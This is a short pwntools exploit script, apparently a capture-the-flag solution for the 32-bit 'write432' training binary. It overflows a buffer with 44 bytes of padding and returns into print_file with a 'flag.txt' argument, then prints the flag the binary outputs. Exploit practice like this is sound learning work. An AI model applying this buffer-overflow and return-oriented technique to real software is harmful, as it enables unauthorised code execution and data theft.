from pwn import *

BINARY = './write432'
context.os  = 'linux'
context.arch = 'i386'
context.binary = ELF(BINARY)


PAYLOAD  = 1
print_file = 0x080483d0
def output2file(data):
    with open('./input', 'wb') as f:
        f.write(data)

def payload_1():
    rop = b"A"*44
    rop += p32(print_file)
    rop += b"bbb\x00g"
    rop += b"flag.txt\x00"
    return rop 

p = process(BINARY)
rop = payload_1()
log.success(f"ROP chain : {rop}")
p.sendline(rop)
flag = p.recvline()
flag = p.recvall()
print(flag)
output2file(rop)
